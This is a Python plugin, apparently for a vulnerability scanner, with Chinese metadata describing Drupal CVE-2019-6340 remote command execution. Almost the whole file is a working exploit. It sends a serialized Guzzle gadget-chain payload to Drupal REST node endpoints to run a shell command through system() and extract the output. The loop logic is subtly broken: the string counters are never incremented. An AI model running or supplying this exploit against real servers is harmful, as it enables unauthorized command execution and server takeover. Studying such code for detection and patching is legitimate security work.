# coding=utf-8
import requests
import time

def get_plugin_info():
    plugin_info = {
        "name": "Drupal CVE-2019-6340远程命令执行",
        "info": "攻击者可利用远程命令执行，获取服务器权限",
        "level": "高危",
        "type": "代码执行",
        "author": "zhangdaoyuan@bg",
        "url": "https://www.exploit-db.com/exploits/46459",
        "keyword": "tag:php",
        "source": 1
    }
    return plugin_info


def recv(s):
        s.recv(1024)
        time.sleep(0.2)

def check(ip, port, timeout):
    f = str(1)
    l = str(100)
    url = "http://" + ip +":" + port
    while f < l:
        exp_url = (
            "{domain}/node/{node_id}?_format=hal_json".format(domain=url, node_id=f)
        )
        cmd = 'echo ---- & ' + 'ps auxf'
        payload = {
            "link": [
                {
                    "value": "link",
                    "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"
                               "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""
                               "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"
                               "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
                               "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"
                               "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"
                               "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""
                               "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                               "".replace('|size|', str(len(cmd))).replace('|command|', cmd)
                }
            ],
            "_links": {
                "type": {
                    "href": "{domain}/rest/type/shortcut/default'".format(domain=url)
                }
            }
        }

        try:
            response = requests.get(exp_url, json=payload, headers={"Content-Type": "application/hal+json"})
            if '----' in response.text:
                result = response.text.split('----')[1]
                return u"Drupal CVE-2019-6340远程命令执行,详情:{detail}".format(detail=result)
        except:
            pass
